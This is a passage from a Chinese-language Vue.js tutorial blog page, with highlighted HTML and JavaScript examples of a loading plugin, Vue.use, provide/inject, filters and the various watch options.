class="string">"loading-wrapper"</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></span><br><span class="line">                    props: &#123;</span><br><span class="line">                        msg: &#123;</span><br><span class="line"><span class="javascript">                            type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">                            <span class="keyword">default</span>: <span class="string">'loading...'</span></span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"><span class="javascript">                &#125;, <span class="string">'LoadingComponent'</span>);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span></span><br><span class="line"><span class="javascript">                div.setAttribute(<span class="string">'id'</span>, <span class="string">'loading-wrapper'</span>);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.body.append(div);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">new</span> LoadingComponent(&#123;</span></span><br><span class="line">                    props: &#123;</span><br><span class="line">                        msg: &#123;</span><br><span class="line"><span class="javascript">                            type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">                            <span class="keyword">default</span>: msg</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"><span class="javascript">                &#125;).$mount(<span class="string">'#loading-wrapper'</span>);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.body.removeChild(<span class="built_in">document</span>.getElementById(<span class="string">'loading-wrapper'</span>));</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Vue.prototype.$loading = Loading;</span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root'</span>,</span></span><br><span class="line">                methods: &#123;</span><br><span class="line">                    showLoading() &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">const</span> hide = <span class="keyword">this</span>.$loading(<span class="string">'正在加载中...'</span>);</span></span><br><span class="line"><span class="javascript">                        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line">                            hide();</span><br><span class="line">                        &#125;, 2000)</span><br><span class="line">                     &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</li>
</ul>
<h3 id="4-Vue-use的用法"><a href="#4-Vue-use的用法" class="headerlink" title="4 Vue.use的用法"></a>4 <code>Vue.use</code>的用法</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue.use 用法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">            <span class="selector-id">#loading-wrapper</span> &#123;</span></span><br><span class="line">                position: fixed;</span><br><span class="line">                top: 0;</span><br><span class="line">                left: 0;</span><br><span class="line">                display: flex;</span><br><span class="line">                justify-content: center;</span><br><span class="line">                align-items: center;</span><br><span class="line">                width: 100%;</span><br><span class="line">                height: 100%;</span><br><span class="line"><span class="css">                <span class="selector-tag">background</span>: <span class="selector-tag">rgba</span>(0, 0, 0, <span class="selector-class">.7</span>);</span></span><br><span class="line"><span class="css">                <span class="selector-tag">color</span>: <span class="selector-id">#ffffff</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"showLoading"</span>&gt;</span>显示loading<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">            /**</span><br><span class="line">             * 调用方式</span><br><span class="line">             *</span><br><span class="line">             * 1创建挂载点，2，创建组件并实例化后并挂载到1的挂载点，3返回删除组件的回调用于删除组件</span><br><span class="line">             *</span><br><span class="line">             * @type &#123;&#123;install: loadingPlugin.install&#125;&#125;</span><br><span class="line">             */</span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> loadingPlugin = &#123;</span></span><br><span class="line"><span class="javascript">                install: <span class="function"><span class="keyword">function</span>(<span class="params">vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">const</span> LoadingComponent = vm.extend(&#123;</span></span><br><span class="line"><span class="xml">                       template: '<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"loading-wrapper"</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></span><br><span class="line">                        props: &#123;</span><br><span class="line">                           msg: &#123;</span><br><span class="line"><span class="javascript">                               type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">                               <span class="keyword">default</span>: <span class="string">'loading...'</span></span></span><br><span class="line">                           &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"><span class="javascript">                    &#125;, <span class="string">'LoadingComponent'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="function"><span class="keyword">function</span> <span class="title">Loading</span>(<span class="params">msg</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">const</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span></span><br><span class="line"><span class="javascript">                        div.setAttribute(<span class="string">'id'</span>, <span class="string">'loading-wrapper'</span>);</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">document</span>.body.append(div)</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(div)</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">new</span> LoadingComponent(&#123;</span></span><br><span class="line">                            props: &#123;</span><br><span class="line">                                msg: &#123;</span><br><span class="line"><span class="javascript">                                    type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">                                    <span class="keyword">default</span>: msg</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"><span class="javascript">                        &#125;).$mount(<span class="string">'#loading-wrapper'</span>);</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                            <span class="built_in">document</span>.body.removeChild(<span class="built_in">document</span>.getElementById(<span class="string">'loading-wrapper'</span>));</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    vm.prototype.$loading = Loading;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"><span class="javascript">            <span class="comment">// 载入插件</span></span></span><br><span class="line">            Vue.use(loadingPlugin);</span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root'</span>,</span></span><br><span class="line">                methods: &#123;</span><br><span class="line">                    showLoading() &#123;</span><br><span class="line"><span class="javascript">                        <span class="comment">// 调用loading模块</span></span></span><br><span class="line"><span class="javascript">                        <span class="keyword">const</span> hide = <span class="keyword">this</span>.$loading(<span class="string">'加载中...'</span>);</span></span><br><span class="line"><span class="javascript">                        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line">                            hide();</span><br><span class="line">                        &#125;, 2000)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<h3 id="5-组件通信provide和inject的使用"><a href="#5-组件通信provide和inject的使用" class="headerlink" title="5 组件通信provide和inject的使用"></a>5 组件通信<code>provide</code>和<code>inject</code>的使用</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>组件通信provide和inject的使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Test</span>&gt;</span><span class="tag">&lt;/<span class="name">Test</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 1 定义插件</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">registerPlugin</span>(<span class="params">vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 1.1 父组件</span></span></span><br><span class="line"><span class="javascript">                Vue.component(<span class="string">'Test'</span>, &#123;</span></span><br><span class="line"><span class="xml">                    template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;<span class="name">Test2</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// 对外的接口，给别的组件访问</span></span></span><br><span class="line">                    provide() &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                            elTest: <span class="keyword">this</span></span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    data() &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                            message: <span class="string">'message from Test'</span></span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    methods: &#123;</span><br><span class="line">                        change(component) &#123;</span><br><span class="line"><span class="javascript">                            <span class="keyword">this</span>.message = <span class="string">'message from '</span> + component;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"><span class="javascript">                <span class="comment">// 1.1.1 子组件</span></span></span><br><span class="line"><span class="javascript">                Vue.component(<span class="string">'Test2'</span>, &#123;</span></span><br><span class="line"><span class="javascript">                    template: <span class="string">'&lt;Test3/&gt;'</span></span></span><br><span class="line">                &#125;);</span><br><span class="line"><span class="javascript">                <span class="comment">// 1.1.1.1子子组件</span></span></span><br><span class="line"><span class="javascript">                Vue.component(<span class="string">'Test3'</span>, &#123;</span></span><br><span class="line"><span class="xml">                    template: '<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"changeMessage"</span>&gt;</span>change<span class="tag">&lt;/<span class="name">button</span>&gt;</span>',</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// 获取爷爷组件</span></span></span><br><span class="line"><span class="javascript">                    inject: [<span class="string">'elTest'</span>],</span></span><br><span class="line">                    methods: &#123;</span><br><span class="line">                        changeMessage() &#123;</span><br><span class="line"><span class="javascript">                            <span class="comment">// 调用爷爷组件的方法</span></span></span><br><span class="line"><span class="javascript">                            <span class="keyword">this</span>.elTest.change(<span class="keyword">this</span>.$options._componentTag);</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="comment">// 2 注册组件 </span></span></span><br><span class="line">            Vue.use(registerPlugin);</span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root'</span></span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<h3 id="6-过滤器的使用-filter"><a href="#6-过滤器的使用-filter" class="headerlink" title="6 过滤器的使用 filter"></a>6 过滤器的使用 <code>filter</code></h3><p>&emsp; 用于对模板的输出进一步处理，通常用于文本的处理<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>过虑器的使用 filter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">            &#123;&#123;message | lower&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">           <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">               el: <span class="string">'#root'</span>,</span></span><br><span class="line">               filters: &#123;</span><br><span class="line">                   lower(value) &#123;</span><br><span class="line"><span class="javascript">                       <span class="keyword">return</span> value.toLowerCase()</span></span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;,</span><br><span class="line">               data() &#123;</span><br><span class="line"><span class="javascript">                   <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                       message: <span class="string">'Hello Vue'</span></span></span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div></p>
<h3 id="7watch的使用"><a href="#7watch的使用" class="headerlink" title="7watch的使用"></a>7<code>watch</code>的使用</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>监听器watch的使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Watch 用法1： 常见用法<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;copyMessage&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root2"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Watch 用法2： 绑定方法<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;copyMessage&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root3"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Watch 用法3：deep + handler<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"deepMessage.a.b"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;copyMessage&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root4"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Watch 用法4：immediate<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;copyMessage&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root5"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Watch 用法5：绑定多个handler<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;copyMessage&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root6"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Watch 用法6：监听对象属性<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"message.a.b"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;copyMessage&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 用法1， 直接在watch内声明要监听的属性，一旦属性一变化就触发监听的方法</span></span></span><br><span class="line"><span class="javascript">           <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">               el: <span class="string">'#root'</span>,</span></span><br><span class="line">                watch: &#123;</span><br><span class="line">                   message(value) &#123;</span><br><span class="line"><span class="javascript">                       <span class="keyword">this</span>.copyMessage = value;</span></span><br><span class="line">                   &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">               data() &#123;</span><br><span class="line"><span class="javascript">                   <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                       message: <span class="string">'Hello Vue'</span>,</span></span><br><span class="line"><span class="javascript">                       copyMessage: <span class="string">''</span></span></span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line"><span class="javascript">           <span class="comment">// 用法2 ，</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root2'</span>,</span></span><br><span class="line">                watch: &#123;</span><br><span class="line"><span class="javascript">                    message: <span class="string">'handleMessage'</span></span></span><br><span class="line">                &#125;,</span><br><span class="line">                data() &#123;</span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                        message: <span class="string">'hello Vue'</span>,</span></span><br><span class="line"><span class="javascript">                        copyMessage: <span class="string">''</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                methods: &#123;</span><br><span class="line">                   handleMessage(value) &#123;</span><br><span class="line"><span class="javascript">                       <span class="keyword">this</span>.copyMessage = value;</span></span><br><span class="line">                   &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            <span class="comment">// 用法3,  这个是对象监听，如果有任意一属性发生变化则触发，如果deep:false，则反之</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root3'</span>,</span></span><br><span class="line">                watch: &#123;</span><br><span class="line">                    deepMessage: &#123;</span><br><span class="line"><span class="javascript">                        handler: <span class="string">'handleDeepMessage'</span>,</span></span><br><span class="line"><span class="javascript">                        deep: <span class="literal">true</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                data: &#123;</span><br><span class="line">                    deepMessage: &#123;</span><br><span class="line">                        a: &#123;</span><br><span class="line"><span class="javascript">                            b: <span class="string">'Deep Message'</span>,</span></span><br><span class="line"><span class="javascript">                            bc: <span class="string">'hello'</span></span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line"><span class="javascript">                    copyMessage: <span class="string">''</span></span></span><br><span class="line">                &#125;,</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    handleDeepMessage(value) &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">this</span>.copyMessage = value.a.bc;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            <span class="comment">// 用法4: immediate，在数据变动前就初始化地先触发一次，然后再监听再触发，相当于:</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//created() &#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//    this.copyMessage = this.message;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//&#125;</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root4'</span>,</span></span><br><span class="line">                watch: &#123;</span><br><span class="line">                    message: &#123;</span><br><span class="line"><span class="javascript">                        handler: <span class="string">'handleMessage'</span>,</span></span><br><span class="line"><span class="javascript">                        immediate: <span class="literal">true</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                data: &#123;</span><br><span class="line"><span class="javascript">                    message: <span class="string">'init info'</span>,</span></span><br><span class="line"><span class="javascript">                    copyMessage: <span class="string">''</span></span></span><br><span class="line">                &#125;,</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    handleMessage(value) &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">this</span>.copyMessage = value;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            <span class="comment">// 用法5，就是当监听器触发时，依次执行绑定的方法或闭包</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root5'</span>,</span></span><br><span class="line">               data: &#123;</span><br><span class="line"><span class="javascript">                    message: <span class="string">'init info'</span>,</span></span><br><span class="line"><span class="javascript">                    copyMessage: <span class="string">''</span></span></span><br><span class="line">               &#125;,</span><br><span class="line">                watch: &#123;</span><br><span class="line">                  message: [</span><br><span class="line">                      &#123;</span><br><span class="line"><span class="javascript">                          handler: <span class="string">'handleMessage'</span>,</span></span><br><span class="line"><span class="javascript">                          immediate: <span class="literal">true</span></span></span><br><span class="line">                      &#125;,</span><br><span class="line">                      &#123;</span><br><span class="line"><span class="javascript">                          handler: <span class="string">'handleMessage2'</span>,</span></span><br><span class="line"><span class="javascript">                          immediate: <span class="literal">true</span></span></span><br><span class="line">                      &#125;,</span><br><span class="line">                      &#123;</span><br><span class="line">                          handler(value) &#123;</span><br><span class="line"><span class="javascript">                              <span class="keyword">this</span>.copyMessage = <span class="keyword">this</span>.copyMessage + <span class="number">3</span>;</span></span><br><span class="line">                          &#125;,</span><br><span class="line"><span class="javascript">                          immediate: <span class="literal">true</span></span></span><br><span class="line">                      &#125;</span><br><span class="line">                  ]</span><br><span class="line">                &#125;,</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    handleMessage(value) &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">this</span>.copyMessage = value;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    handleMessage2(value) &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">this</span>.copyMessage = <span class="keyword">this</span>.copyMessage + <span class="number">2</span>;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            <span class="comment">// 用法6, 监听对象的单个属性，类似于用法3，但用法3监听的是整个对象如果哪个属性发生变化，则要遍历到，所以这个会省性能很多</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root6'</span>,</span></span><br><span class="line">                data: &#123;</span><br><span class="line">                    message: &#123;</span><br><span class="line">                        a: &#123;</span><br><span class="line"><span class="javascript">                            b: <span class="string">'hello vue'</span></span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line"><span class="javascript">                    copyMessage: <span class="string">''</span></span></span><br><span class="line">                &#125;,</span><br><span class="line">                watch: &#123;</span><br><span class="line"><span class="javascript">                    <span class="string">'message.a.b'</span>: <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">this</span>.copyMessage = value;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
